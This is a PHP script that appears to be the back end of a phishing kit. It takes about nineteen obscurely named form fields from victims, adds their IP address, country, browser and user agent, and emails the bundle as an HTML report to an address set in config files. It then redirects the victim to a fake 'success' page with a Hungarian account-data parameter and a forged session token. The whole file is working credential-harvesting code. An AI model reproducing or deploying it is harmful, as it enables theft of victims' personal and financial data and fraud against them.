<?php
error_reporting(0);
session_start();
include("./config/madara.php");
include("./config/obito.php");
include("lang/". $_SESSION['_lang_'].".php");
        $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	 $subject  = " gomara  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
    $headers  = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= "From: madara@madara.hu" . "\r\n";
	$message = "

<body style='background: black;'>			
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font color='white'>_____________________________________________________________________<br>
<font color='white'>IP         =>   <font color='#290DFF'>".$_SESSION['_IP_']."</font><br />
<font color='white'>TIME       =>   <font color='#290DFF'>".$time."</font><br />
<font color='white'>BROWSER    =>   <font color='#290DFF'>".$browser."</font><br />
<font color='white'>AGENT      =>   <font color='#290DFF'>".$user_agent."</font><br />
<font color='white'>_____________________________________________________________________<br>
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['az']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['sz']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['je']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['di']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['jj']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['ci']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['ji']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['net']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['be']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['fe']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['bbe']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['azo']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['jo']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['fel']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['joo']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['mk']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['jk']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['uni']."</font><br />
<font color='white'>gomara     : <font color='chartreuse'>".$_POST['jooo']."</font><br />
<font color='white'>___________________________________________________________________";
	@mail($to,$subject,$message,$headers);

      $x=md5(microtime());$xx=sha1(microtime());
echo "<script> window.top.location.href = './success.php?cmd=_szamla-adatai&session=".$x.$xx."';   </script>";
?>